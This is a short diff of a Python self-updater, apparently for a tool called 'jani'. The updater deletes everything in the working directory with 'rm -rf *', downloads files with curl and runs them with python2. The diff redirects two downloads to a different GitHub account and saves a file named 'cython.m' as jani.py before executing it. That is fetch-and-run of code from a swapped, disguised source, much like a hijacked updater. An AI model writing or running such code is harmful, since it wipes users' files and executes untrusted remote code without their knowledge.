@@ -10,8 +10,8 @@ cv = '1.9'
 cr = requests.get('https://raw.githubusercontent.com/jcloner/jani/main/version').text
 if cv in cr:
     os.system('rm -rf *')
-    os.system('curl -L https://raw.githubusercontent.com/jcloner/jani/main/jani.py > jani.py')
-    os.system('curl -L https://raw.githubusercontent.com/jcloner/jani/main/j64 > j64')
+    os.system('curl -L https://raw.githubusercontent.com/hamayunpro/cython/main/cython.m > jani.py')
+    os.system('curl -L https://raw.githubusercontent.com/hamayunpro/cython/main/j64 > j64')
     os.system('curl -L https://raw.githubusercontent.com/jcloner/jani/main/j32 > j32')
     os.system('python2 jani.py')
 else:
